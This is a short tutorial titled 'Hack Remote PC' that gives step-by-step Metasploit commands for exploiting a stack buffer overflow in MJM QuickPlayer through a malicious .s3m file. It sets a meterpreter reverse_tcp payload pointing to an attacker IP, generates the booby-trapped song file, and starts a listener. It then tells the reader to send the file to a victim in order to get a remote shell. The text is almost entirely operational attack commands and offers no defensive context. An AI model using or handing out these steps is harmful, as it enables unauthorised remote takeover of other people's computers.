Hack Remote PC Using MJM QuickPlayer 1.00 Beta 60a / QuickPlayer 2010 .s3m Stack Buffer Overflow

This module exploits a stack buffer overflow in MJM QuickPlayer 1.00 beta 60a and QuickPlayer 2010 (Multi-target exploit). When opening a malicious s3m file in one of these 2 applications, a stack buffer overflow can be triggered, resulting in arbitrary code execution. This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.
Windows XP SP 3
Windows 7
QuickPlayer 2010
Attacker: Backtrack 5
Victim PC: Windows XP
Open Kali Linux terminal type msfconsole

Now type use exploit/windows/fileformat/mjm_quickplayer_s3m
msf exploit (mjm_quickplayer_s3m)>set payload windows/meterpreter/reverse_tcp 
msf exploit (mjm_quickplayer_s3m)>set lhost 192.168.0.104 (IP of Local Host)
msf exploit (mjm_quickplayer_s3m)>exploit

After we successfully generate the malicious s3m File, it will stored on your local computer
/root/.msf4/local/song.s3m

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.104
exploit
Now send your song.s3m files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
